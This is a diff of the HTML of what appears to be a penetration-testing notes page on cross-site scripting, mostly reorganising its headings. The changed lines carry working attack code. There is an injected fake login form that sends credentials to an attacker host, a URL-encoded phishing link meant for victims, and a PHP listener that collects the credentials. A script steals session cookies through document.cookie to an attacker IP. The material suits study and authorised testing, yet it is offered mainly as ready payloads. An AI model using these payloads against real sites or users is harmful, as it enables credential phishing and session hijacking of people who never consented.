@@ -624,15 +624,38 @@
 </li>
       
         <li class="md-nav__item">
-  <a href="#xss-discovery-methods" class="md-nav__link">
+  <a href="#discovery" class="md-nav__link">
     <span class="md-ellipsis">
       
-        XSS Discovery Methods
+        Discovery
       
     </span>
   </a>
   
-    <nav class="md-nav" aria-label="XSS Discovery Methods">
+    <nav class="md-nav" aria-label="Discovery">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#basic-test" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Basic test
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#tools" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Tools
+      
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="Tools">
       <ul class="md-nav__list">
         
           <li class="md-nav__item">
@@ -650,8 +673,25 @@
     </nav>
   
 </li>
+        
+      </ul>
+    </nav>
+  
+</li>
       
         <li class="md-nav__item">
+  <a href="#exploiting-xss" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Exploiting XSS
+      
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="Exploiting XSS">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
   <a href="#xss-payloads" class="md-nav__link">
     <span class="md-ellipsis">
       
@@ -661,8 +701,8 @@
   </a>
   
 </li>
-      
-        <li class="md-nav__item">
+        
+          <li class="md-nav__item">
   <a href="#phishing" class="md-nav__link">
     <span class="md-ellipsis">
       
@@ -670,6 +710,11 @@
       
     </span>
   </a>
+  
+</li>
+        
+      </ul>
+    </nav>
   
 </li>
       
@@ -1254,15 +1299,38 @@
 </li>
       
         <li class="md-nav__item">
-  <a href="#xss-discovery-methods" class="md-nav__link">
+  <a href="#discovery" class="md-nav__link">
     <span class="md-ellipsis">
       
-        XSS Discovery Methods
+        Discovery
       
     </span>
   </a>
   
-    <nav class="md-nav" aria-label="XSS Discovery Methods">
+    <nav class="md-nav" aria-label="Discovery">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#basic-test" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Basic test
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#tools" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Tools
+      
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="Tools">
       <ul class="md-nav__list">
         
           <li class="md-nav__item">
@@ -1280,8 +1348,25 @@
     </nav>
   
 </li>
+        
+      </ul>
+    </nav>
+  
+</li>
       
         <li class="md-nav__item">
+  <a href="#exploiting-xss" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Exploiting XSS
+      
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="Exploiting XSS">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
   <a href="#xss-payloads" class="md-nav__link">
     <span class="md-ellipsis">
       
@@ -1291,8 +1376,8 @@
   </a>
   
 </li>
-      
-        <li class="md-nav__item">
+        
+          <li class="md-nav__item">
   <a href="#phishing" class="md-nav__link">
     <span class="md-ellipsis">
       
@@ -1300,6 +1385,11 @@
       
     </span>
   </a>
+  
+</li>
+        
+      </ul>
+    </nav>
   
 </li>
       
@@ -1389,7 +1479,11 @@
 </tr>
 </tbody>
 </table>
-<h2 id="xss-discovery-methods">XSS Discovery Methods</h2>
+<h2 id="discovery">Discovery</h2>
+<h3 id="basic-test">Basic test</h3>
+<div class="language-js highlight"><table class="highlighttable"><tr><th colspan="2" class="filename"><span class="filename">JavaScript</span></th></tr><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal">1</span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-0-1"><span class="o">&lt;</span><span class="nx">script</span><span class="o">&gt;</span><span class="nx">alert</span><span class="p">(</span><span class="nb">window</span><span class="p">.</span><span class="nx">origin</span><span class="p">)</span><span class="o">&lt;</span><span class="err">/script&gt;</span>
+</span></code></pre></div></td></tr></table></div>
+<h3 id="tools">Tools</h3>
 <ul>
 <li>Nessus</li>
 <li>Burp Pro</li>
@@ -1397,18 +1491,23 @@
 <li><a href="https://github.com/s0md3v/XSStrike">XSS Strike</a></li>
 <li><a href="https://github.com/epsylon/xsser">XSSer</a></li>
 </ul>
-<h3 id="xss-strike">XSS Strike</h3>
+<h4 id="xss-strike">XSS Strike</h4>
 <div class="language-bash highlight"><table class="highlighttable"><tr><th colspan="2" class="filename"><span class="filename">Bash</span></th></tr><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal">1</span>
 <span class="normal">2</span>
 <span class="normal">3</span>
 <span class="normal">4</span>
-<span class="normal">5</span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-0-1">git<span class="w"> </span>clone<span class="w"> </span>https://github.com/s0md3v/XSStrike.git
-</span><span id="__span-0-2"><span class="nb">cd</span><span class="w"> </span>XSStrike
-</span><span id="__span-0-3">pip<span class="w"> </span>install<span class="w"> </span>-r<span class="w"> </span>requirements.txt
-</span><span id="__span-0-4">python<span class="w"> </span>xsstrike.py
-</span><span id="__span-0-5">python<span class="w"> </span>xsstrike.py<span class="w"> </span>-u<span class="w"> </span><span class="s2">&quot;http://SERVER_IP:PORT/index.php?task=test&quot;</span>
+<span class="normal">5</span>
+<span class="normal">6</span>
+<span class="normal">7</span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-1-1">git<span class="w"> </span>clone<span class="w"> </span>https://github.com/s0md3v/XSStrike.git
+</span><span id="__span-1-2"><span class="nb">cd</span><span class="w"> </span>XSStrike
+</span><span id="__span-1-3">python3<span class="w"> </span>-m<span class="w"> </span>venv<span class="w"> </span>.venv
+</span><span id="__span-1-4"><span class="nb">source</span><span class="w"> </span>.venv/bin/activate
+</span><span id="__span-1-5">pip<span class="w"> </span>install<span class="w"> </span>-r<span class="w"> </span>requirements.txt
+</span><span id="__span-1-6">python<span class="w"> </span>xsstrike.py
+</span><span id="__span-1-7">python<span class="w"> </span>xsstrike.py<span class="w"> </span>-u<span class="w"> </span><span class="s2">&quot;http://SERVER_IP:PORT/index.php?task=test&quot;</span>
 </span></code></pre></div></td></tr></table></div>
-<h2 id="xss-payloads">XSS Payloads</h2>
+<h2 id="exploiting-xss">Exploiting XSS</h2>
+<h3 id="xss-payloads">XSS Payloads</h3>
 <table>
 <thead>
 <tr>
@@ -1472,9 +1571,9 @@
 <li><a href="https://github.com/payloadbox/xss-payload-list">PayloadBox</a></li>
 </ul>
 <p><strong>Note:</strong> XSS can be injected into any input in the HTML page, which is not exclusive to HTML input fields, but may also be in HTTP headers like the Cookie or User-Agent (i.e., when their values are displayed on the page).</p>
-<h2 id="phishing">Phishing</h2>
+<h3 id="phishing">Phishing</h3>
 <p>Initial step is to identify a working payload, ie:</p>
-<div class="language-js highlight"><table class="highlighttable"><tr><th colspan="2" class="filename"><span class="filename">JavaScript</span></th></tr><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal">1</span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-1-1"><span class="err">&#39;</span><span class="o">&gt;&lt;</span><span class="nx">script</span><span class="o">&gt;</span><span class="nx">alert</span><span class="p">(</span><span class="mf">1</span><span class="p">)</span><span class="o">&lt;</span><span class="err">/script&gt;</span>
+<div class="language-js highlight"><table class="highlighttable"><tr><th colspan="2" class="filename"><span class="filename">JavaScript</span></th></tr><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal">1</span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-2-1"><span class="err">&#39;</span><span class="o">&gt;&lt;</span><span class="nx">script</span><span class="o">&gt;</span><span class="nx">alert</span><span class="p">(</span><span class="mf">1</span><span class="p">)</span><span class="o">&lt;</span><span class="err">/script&gt;</span>
 </span></code></pre></div></td></tr></table></div>
 <p>Example of a basic HTML login form:</p>
 <div class="language-html highlight"><table class="highlighttable"><tr><th colspan="2" class="filename"><span class="filename">HTML</span></th></tr><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal">1</span>
@@ -1482,36 +1581,35 @@
 <span class="normal">3</span>
 <span class="normal">4</span>
 <span class="normal">5</span>
-<span class="normal">6</span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-2-1"><span class="p">&lt;</span><span class="nt">h3</span><span class="p">&gt;</span>Please login to continue<span class="p">&lt;/</span><span class="nt">h3</span><span class="p">&gt;</span>
-</span><span id="__span-2-2"><span class="p">&lt;</span><span class="nt">form</span> <span class="na">action</span><span class="o">=</span><span class="s">http://OUR_IP</span><span class="p">&gt;</span>
-</span><span id="__span-2-3">    <span class="p">&lt;</span><span class="nt">input</span> <span class="na">type</span><span class="o">=</span><span class="s">&quot;username&quot;</span> <span class="na">name</span><span class="o">=</span><span class="s">&quot;username&quot;</span> <span class="na">placeholder</span><span class="o">=</span><span class="s">&quot;Username&quot;</span><span class="p">&gt;</span>
-</span><span id="__span-2-4">    <span class="p">&lt;</span><span class="nt">input</span> <span class="na">type</span><span class="o">=</span><span class="s">&quot;password&quot;</span> <span class="na">name</span><span class="o">=</span><span class="s">&quot;password&quot;</span> <span class="na">placeholder</span><span class="o">=</span><span class="s">&quot;Password&quot;</span><span class="p">&gt;</span>
-</span><span id="__span-2-5">    <span class="p">&lt;</span><span class="nt">input</span> <span class="na">type</span><span class="o">=</span><span class="s">&quot;submit&quot;</span> <span class="na">name</span><span class="o">=</span><span class="s">&quot;submit&quot;</span> <span class="na">value</span><span class="o">=</span><span class="s">&quot;Login&quot;</span><span class="p">&gt;</span>
-</span><span id="__span-2-6"><span class="p">&lt;/</span><span class="nt">form</span><span class="p">&gt;</span>
+<span class="normal">6</span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-3-1"><span class="p">&lt;</span><span class="nt">h3</span><span class="p">&gt;</span>Please login to continue<span class="p">&lt;/</span><span class="nt">h3</span><span class="p">&gt;</span>
+</span><span id="__span-3-2"><span class="p">&lt;</span><span class="nt">form</span> <span class="na">action</span><span class="o">=</span><span class="s">http://OUR_IP</span><span class="p">&gt;</span>
+</span><span id="__span-3-3">    <span class="p">&lt;</span><span class="nt">input</span> <span class="na">type</span><span class="o">=</span><span class="s">&quot;username&quot;</span> <span class="na">name</span><span class="o">=</span><span class="s">&quot;username&quot;</span> <span class="na">placeholder</span><span class="o">=</span><span class="s">&quot;Username&quot;</span><span class="p">&gt;</span>
+</span><span id="__span-3-4">    <span class="p">&lt;</span><span class="nt">input</span> <span class="na">type</span><span class="o">=</span><span class="s">&quot;password&quot;</span> <span class="na">name</span><span class="o">=</span><span class="s">&quot;password&quot;</span> <span class="na">placeholder</span><span class="o">=</span><span class="s">&quot;Password&quot;</span><span class="p">&gt;</span>
+</span><span id="__span-3-5">    <span class="p">&lt;</span><span class="nt">input</span> <span class="na">type</span><span class="o">=</span><span class="s">&quot;submit&quot;</span> <span class="na">name</span><span class="o">=</span><span class="s">&quot;submit&quot;</span> <span class="na">value</span><span class="o">=</span><span class="s">&quot;Login&quot;</span><span class="p">&gt;</span>
+</span><span id="__span-3-6"><span class="p">&lt;/</span><span class="nt">form</span><span class="p">&gt;</span>
 </span></code></pre></div></td></tr></table></div>
 <p>Which can be minified and put into JS:</p>
-<div class="language-js highlight"><table class="highlighttable"><tr><th colspan="2" class="filename"><span class="filename">JavaScript</span></th></tr><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal">1</span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-3-1"><span class="nb">document</span><span class="p">.</span><span class="nx">write</span><span class="p">(</span><span class="s1">&#39;&lt;h3&gt;Please login to continue&lt;/h3&gt;&lt;form action=http://OUR_IP&gt;&lt;input type=&quot;username&quot; name=&quot;username&quot; placeholder=&quot;Username&quot;&gt;&lt;input type=&quot;password&quot; name=&quot;password&quot; placeholder=&quot;Password&quot;&gt;&lt;input type=&quot;submit&quot; name=&quot;submit&quot; value=&quot;Login&quot;&gt;&lt;/form&gt;&#39;</span><span class="p">);</span>
+<div class="language-js highlight"><table class="highlighttable"><tr><th colspan="2" class="filename"><span class="filename">JavaScript</span></th></tr><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal">1</span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-4-1"><span class="nb">document</span><span class="p">.</span><span class="nx">write</span><span class="p">(</span><span class="s1">&#39;&lt;h3&gt;Please login to continue&lt;/h3&gt;&lt;form action=http://OUR_IP&gt;&lt;input type=&quot;username&quot; name=&quot;username&quot; placeholder=&quot;Username&quot;&gt;&lt;input type=&quot;password&quot; name=&quot;password&quot; placeholder=&quot;Password&quot;&gt;&lt;input type=&quot;submit&quot; name=&quot;submit&quot; value=&quot;Login&quot;&gt;&lt;/form&gt;&#39;</span><span class="p">);</span>
 </span></code></pre></div></td></tr></table></div>
 <p>To make the new form more likely to succeed, the original page HTML code should be removed:</p>
 <p>Original code example:</p>
 <div class="language-html highlight"><table class="highlighttable"><tr><th colspan="2" class="filename"><span class="filename">HTML</span></th></tr><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal">1</span>
 <span class="normal">2</span>
-<span class="normal">3</span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-4-1"><span class="p">&lt;</span><span class="nt">form</span> <span class="na">role</span><span class="o">=</span><span class="s">&quot;form&quot;</span> <span class="na">action</span><span class="o">=</span><span class="s">&quot;index.php&quot;</span> <span class="na">method</span><span class="o">=</span><span class="s">&quot;GET&quot;</span> <span class="na">id</span><span class="o">=</span><span class="s">&#39;urlform&#39;</span><span class="p">&gt;</span>
-</span><span id="__span-4-2">    <span class="p">&lt;</span><span class="nt">input</span> <span class="na">type</span><span class="o">=</span><span class="s">&quot;text&quot;</span> <span class="na">placeholder</span><span class="o">=</span><span class="s">&quot;Image URL&quot;</span> <span class="na">name</span><span class="o">=</span><span class="s">&quot;url&quot;</span><span class="p">&gt;</span>
-</span><span id="__span-4-3"><span class="p">&lt;/</span><span class="nt">form</span><span class="p">&gt;</span>
+<span class="normal">3</span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-5-1"><span class="p">&lt;</span><span class="nt">form</span> <span class="na">role</span><span class="o">=</span><span class="s">&quot;form&quot;</span> <span class="na">action</span><span class="o">=</span><span class="s">&quot;index.php&quot;</span> <span class="na">method</span><span class="o">=</span><span class="s">&quot;GET&quot;</span> <span class="na">id</span><span class="o">=</span><span class="s">&#39;urlform&#39;</span><span class="p">&gt;</span>
+</span><span id="__span-5-2">    <span class="p">&lt;</span><span class="nt">input</span> <span class="na">type</span><span class="o">=</span><span class="s">&quot;text&quot;</span> <span class="na">placeholder</span><span class="o">=</span><span class="s">&quot;Image URL&quot;</span> <span class="na">name</span><span class="o">=</span><span class="s">&quot;url&quot;</span><span class="p">&gt;</span>
+</span><span id="__span-5-3"><span class="p">&lt;/</span><span class="nt">form</span><span class="p">&gt;</span>
 </span></code></pre></div></td></tr></table></div>
 <p>Removal code:</p>
-<div class="language-js highlight"><table class="highlighttable"><tr><th colspan="2" class="filename"><span class="filename">JavaScript</span></th></tr><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal">1</span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-5-1"><span class="nb">document</span><span class="p">.</span><span class="nx">getElementById</span><span class="p">(</span><span class="s1">&#39;urlform&#39;</span><span class="p">).</span><span class="nx">remove</span><span class="p">()</span>
+<div class="language-js highlight"><table class="highlighttable"><tr><th colspan="2" class="filename"><span class="filename">JavaScript</span></th></tr><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal">1</span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-6-1"><span class="nb">document</span><span class="p">.</span><span class="nx">getElementById</span><span class="p">(</span><span class="s1">&#39;urlform&#39;</span><span class="p">).</span><span class="nx">remove</span><span class="p">()</span>
 </span></code></pre></div></td></tr></table></div>
 <p>Adding a comment tag to the end of the payload will remove any remaining code after the exploit form:</p>
-<div class="language-html highlight"><table class="highlighttable"><tr><th colspan="2" class="filename"><span class="filename">HTML</span></th></tr><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal">1</span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-6-1">...PAYLOAD... <span class="err">&lt;</span>!-- 
+<div class="language-html highlight"><table class="highlighttable"><tr><th colspan="2" class="filename"><span class="filename">HTML</span></th></tr><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal">1</span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-7-1">...PAYLOAD... <span class="err">&lt;</span>!-- 
 </span></code></pre></div></td></tr></table></div>
 <p>Complete injection code:</p>
-<div class="language-js highlight"><table class="highlighttable"><tr><th colspan="2" class="filename"><span class="filename">JavaScript</span></th></tr><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal">1</span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-7-1"><span class="s1">&#39;&gt;&lt;script&gt;document.write(&#39;</span><span class="o">&lt;</span><span class="nx">h3</span><span class="o">&gt;</span><span class="nx">Please</span><span class="w"> </span><span class="nx">login</span><span class="w"> </span><span class="nx">to</span><span class="w"> </span><span class="k">continue</span><span class="o">&lt;</span><span class="sr">/h3&gt;&lt;form action=http:/</span><span class="o">/</span><span class="nx">PWNIP</span><span class="o">:</span><span class="nx">PWNPO</span><span class="o">&gt;&lt;</span><span class="nx">input</span><span class="w"> </span><span class="nx">type</span><span class="o">=</span><span class="s2">&quot;username&quot;</span><span class="w"> </span><span class="nx">name</span><span class="o">=</span><span class="s2">&quot;username&quot;</span><span class="w"> </span><span class="nx">placeholder</span><span class="o">=</span><span class="s2">&quot;Username&quot;</span><span class="o">&gt;&lt;</span><span class="nx">input</span><span class="w"> </span><span class="nx">type</span><span class="o">=</span><span class="s2">&quot;password&quot;</span><span class="w"> </span><span class="nx">name</span><span class="o">=</span><span class="s2">&quot;password&quot;</span><span class="w"> </span><span class="nx">placeholder</span><span class="o">=</span><span class="s2">&quot;Password&quot;</span><span class="o">&gt;&lt;</span><span class="nx">input</span><span class="w"> </span><span class="nx">type</span><span class="o">=</span><span class="s2">&quot;submit&quot;</span><span class="w"> </span><span class="nx">name</span><span class="o">=</span><span class="s2">&quot;submit&quot;</span><span class="w"> </span><span class="nx">value</span><span class="o">=</span><span class="s2">&quot;Login&quot;</span><span class="o">&gt;&lt;</span><span class="err">/form&gt;&#39;);document.getElementById(&#39;urlform&#39;).remove();&lt;/script&gt;&lt;!--</span>
+<div class="language-js highlight"><table class="highlighttable"><tr><th colspan="2" class="filename"><span class="filename">JavaScript</span></th></tr><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal">1</span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-8-1"><span class="s1">&#39;&gt;&lt;script&gt;document.write(&#39;</span><span class="o">&lt;</span><span class="nx">h3</span><span class="o">&gt;</span><span class="nx">Please</span><span class="w"> </span><span class="nx">login</span><span class="w"> </span><span class="nx">to</span><span class="w"> </span><span class="k">continue</span><span class="o">&lt;</span><span class="sr">/h3&gt;&lt;form action=http:/</span><span class="o">/</span><span class="nx">PWNIP</span><span class="o">:</span><span class="nx">PWNPO</span><span class="o">&gt;&lt;</span><span class="nx">input</span><span class="w"> </span><span class="nx">type</span><span class="o">=</span><span class="s2">&quot;username&quot;</span><span class="w"> </span><span class="nx">name</span><span class="o">=</span><span class="s2">&quot;username&quot;</span><span class="w"> </span><span class="nx">placeholder</span><span class="o">=</span><span class="s2">&quot;Username&quot;</span><span class="o">&gt;&lt;</span><span class="nx">input</span><span class="w"> </span><span class="nx">type</span><span class="o">=</span><span class="s2">&quot;password&quot;</span><span class="w"> </span><span class="nx">name</span><span class="o">=</span><span class="s2">&quot;password&quot;</span><span class="w"> </span><span class="nx">placeholder</span><span class="o">=</span><span class="s2">&quot;Password&quot;</span><span class="o">&gt;&lt;</span><span class="nx">input</span><span class="w"> </span><span class="nx">type</span><span class="o">=</span><span class="s2">&quot;submit&quot;</span><span class="w"> </span><span class="nx">name</span><span class="o">=</span><span class="s2">&quot;submit&quot;</span><span class="w"> </span><span class="nx">value</span><span class="o">=</span><span class="s2">&quot;Login&quot;</span><span class="o">&gt;&lt;</span><span class="err">/form&gt;&#39;);document.getElementById(&#39;urlform&#39;).remove();&lt;/script&gt;&lt;!--</span>
 </span></code></pre></div></td></tr></table></div>
 <p>The payload should then be added to the URL parameter, encoded, and sent to the victim:</p>
-<div class="language-text highlight"><table class="highlighttable"><tr><th colspan="2" class="filename"><span class="filename">Text Only</span></th></tr><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal">1</span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-8-1">http://PWNIP/phishing/index.php?url=%27%3E%3Cscript%3Edocument.write%28%27%3Ch3%3EPlease+login+to+continue%3C%2Fh3%3E%3Cform+action%3Dhttp%3A%2F%2FPWNIP%3APWNPO%3E%3Cinput+type%3D%22username%22+name%3D%22username%22+placeholder%3D%22Username%22%3E%3Cinput+type%3D%22password%22+name%3D%22password%22+placeholder%3D%22Password%22%3E%3Cinput+type%3D%22submit%22+name%3D%22submit%22+value%3D%22Login%22%3E%3C%2Fform%3E%27%29%3Bdocument.getElementById%28%27urlform%27%29.remove%28%29%3B%3C%2Fscript%3E%3C%21--
-</span></code></pre></div></td></tr></table></div>
+<p><code>http://PWNIP/phishing/index.php?url=%27%3E%3Cscript%3Edocument.write%28%27%3Ch3%3EPlease+login+to+continue%3C%2Fh3%3E%3Cform+action%3Dhttp%3A%2F%2FPWNIP%3APWNPO%3E%3Cinput+type%3D%22username%22+name%3D%22username%22+placeholder%3D%22Username%22%3E%3Cinput+type%3D%22password%22+name%3D%22password%22+placeholder%3D%22Password%22%3E%3Cinput+type%3D%22submit%22+name%3D%22submit%22+value%3D%22Login%22%3E%3C%2Fform%3E%27%29%3Bdocument.getElementById%28%27urlform%27%29.remove%28%29%3B%3C%2Fscript%3E%3C%21--</code></p>
 <p>We can then use a basic PHP listener that will retrieve the creds and send the victim to the origin page, simulating a successful login:</p>
 <p><strong>index.php</strong></p>
 <div class="language-php highlight"><table class="highlighttable"><tr><th colspan="2" class="filename"><span class="filename">PHP</span></th></tr><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal">1</span>
@@ -1575,7 +1673,7 @@
 <p>If we successfully find a blind XSS vulnerability we can attempt a session hijaking attack.</p>
 <p>Create two files:</p>
 <p><strong>script.js</strong></p>
-<div class="language-js highlight"><table class="highlighttable"><tr><th colspan="2" class="filename"><span class="filename">JavaScript</span></th></tr><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal">1</span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-14-1"><span class="ow">new</span><span class="w"> </span><span class="nx">Image</span><span class="p">().</span><span class="nx">src</span><span class="o">=</span><span class="s1">&#39;http://PWNIP:PWNPO/index.php?c=&#39;</span><span class="o">+</span><span class="nb">document</span><span class="p">.</span><span class="nx">cookie</span><span class="p">;</span>
+<div class="language-js highlight"><table class="highlighttable"><tr><th colspan="2" class="filename"><span class="filename">JavaScript</span></th></tr><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal">1</span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-14-1"><span class="ow">new</span><span class="w"> </span><span class="nx">Image</span><span class="p">().</span><span class="nx">src</span><span class="o">=</span><span class="s1">&#39;http://OURIP/index.php?c=&#39;</span><span class="o">+</span><span class="nb">document</span><span class="p">.</span><span class="nx">cookie</span><span class="p">;</span>
 </span></code></pre></div></td></tr></table></div>
 <p><strong>index.php</strong></p>
 <div class="language-php highlight"><table class="highlighttable"><tr><th colspan="2" class="filename"><span class="filename">PHP</span></th></tr><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"> 1</span>
@@ -1601,10 +1699,10 @@
 </span><span id="__span-15-11"><span class="cp">?&gt;</span>
 </span></code></pre></div></td></tr></table></div>
 <p>Start a php server:</p>
-<div class="language-bash highlight"><table class="highlighttable"><tr><th colspan="2" class="filename"><span class="filename">Bash</span></th></tr><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal">1</span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-16-1">php<span class="w"> </span>-S<span class="w"> </span><span class="m">0</span>.0.0.0:PWNPO
+<div class="language-bash highlight"><table class="highlighttable"><tr><th colspan="2" class="filename"><span class="filename">Bash</span></th></tr><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal">1</span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-16-1">php<span class="w"> </span>-S<span class="w"> </span><span class="m">0</span>.0.0.0:OURPO
 </span></code></pre></div></td></tr></table></div>
 <p>Use identified exploit to call script.js, ie:</p>
-<div class="language-js highlight"><table class="highlighttable"><tr><th colspan="2" class="filename"><span class="filename">JavaScript</span></th></tr><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal">1</span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-17-1"><span class="err">&quot;</span><span class="o">&gt;&lt;</span><span class="nx">script</span><span class="w"> </span><span class="nx">src</span><span class="o">=</span><span class="nx">http</span><span class="o">:</span><span class="c1">//PWNIP:PWNPO/script.js&gt;&lt;/script&gt;</span>
+<div class="language-js highlight"><table class="highlighttable"><tr><th colspan="2" class="filename"><span class="filename">JavaScript</span></th></tr><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal">1</span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-17-1"><span class="err">&quot;</span><span class="o">&gt;&lt;</span><span class="nx">script</span><span class="w"> </span><span class="nx">src</span><span class="o">=</span><span class="nx">http</span><span class="o">:</span><span class="c1">//OURIP:OURPO/script.js&gt;&lt;/script&gt;</span>
 </span></code></pre></div></td></tr></table></div>
 <h2 id="useful-commands">Useful Commands</h2>
 <table>
